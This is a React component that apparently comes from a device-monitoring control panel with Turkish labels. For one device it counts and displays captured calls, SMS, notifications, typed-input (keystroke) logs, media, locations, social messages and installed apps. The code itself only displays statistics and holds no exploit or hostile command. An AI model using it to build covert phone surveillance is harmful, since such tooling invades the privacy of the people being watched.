'use client';

import { useEffect, useState } from 'react';
import { api } from '@/lib/api';

interface Stats {
  calls: number;
  sms: number;
  notifications: number;
  inputs: number;
  media: number;
  locations: number;
  social: number;
  apps: number;
}

const STAT_ITEMS: {
  key: keyof Stats;
  label: string;
  icon: string;
  gradient: string;
  bar: string;
}[] = [
  { key: 'social', label: 'Sosyal', icon: '💬', gradient: 'stat-card-emerald', bar: 'bg-emerald-500' },
  { key: 'calls', label: 'Arama', icon: '📞', gradient: 'stat-card-blue', bar: 'bg-blue-500' },
  { key: 'sms', label: 'SMS', icon: '✉️', gradient: 'stat-card-violet', bar: 'bg-violet-500' },
  { key: 'notifications', label: 'Bildirim', icon: '🔔', gradient: 'stat-card-amber', bar: 'bg-amber-500' },
  { key: 'inputs', label: 'Yazılan', icon: '⌨️', gradient: 'stat-card-rose', bar: 'bg-rose-500' },
  { key: 'media', label: 'Medya', icon: '📷', gradient: 'stat-card-cyan', bar: 'bg-cyan-500' },
  { key: 'locations', label: 'Konum', icon: '📍', gradient: 'stat-card-indigo', bar: 'bg-indigo-500' },
  { key: 'apps', label: 'Uygulama', icon: '📱', gradient: 'stat-card-teal', bar: 'bg-teal-500' },
];

export function DeviceStats({ deviceId }: { deviceId: string }) {
  const [stats, setStats] = useState<Stats | null>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    let cancelled = false;
    setLoading(true);
    Promise.all([
      api.getCalls(deviceId),
      api.getSms(deviceId),
      api.getNotifications(deviceId),
      api.getInputLogs(deviceId),
      api.getMedia(deviceId),
      api.getLocations(deviceId),
      api.getSocial(deviceId),
      api.getInstalledApps(deviceId),
    ])
      .then(([calls, sms, notifications, inputs, media, locations, social, appsData]) => {
        if (cancelled) return;
        setStats({
          calls: calls.length,
          sms: sms.length,
          notifications: notifications.length,
          inputs: inputs.length,
          media: media.length,
          locations: locations.length,
          social: social.length,
          apps: appsData.apps.filter((a) => a.isInstalled).length,
        });
      })
      .catch(() => {
        if (!cancelled) setStats(null);
      })
      .finally(() => {
        if (!cancelled) setLoading(false);
      });
    return () => {
      cancelled = true;
    };
  }, [deviceId]);

  if (loading) {
    return (
      <div className="stats-grid">
        {Array.from({ length: 8 }).map((_, i) => (
          <div key={i} className="stat-card stat-card-skeleton animate-pulse" />
        ))}
      </div>
    );
  }

  if (!stats) return null;

  const max = Math.max(...Object.values(stats), 1);

  return (
    <div className="stats-grid">
      {STAT_ITEMS.map((item) => {
        const value = stats[item.key];
        const pct = Math.max(8, Math.round((value / max) * 100));
        return (
          <div key={item.key} className={`stat-card ${item.gradient}`}>
            <div className="flex items-start justify-between gap-2">
              <span className="stat-icon">{item.icon}</span>
              <span className="stat-value">{value}</span>
            </div>
            <p className="stat-label">{item.label}</p>
            <div className="stat-bar-track">
              <div className={`stat-bar-fill ${item.bar}`} style={{ width: `${pct}%` }} />
            </div>
          </div>
        );
      })}
    </div>
  );
}
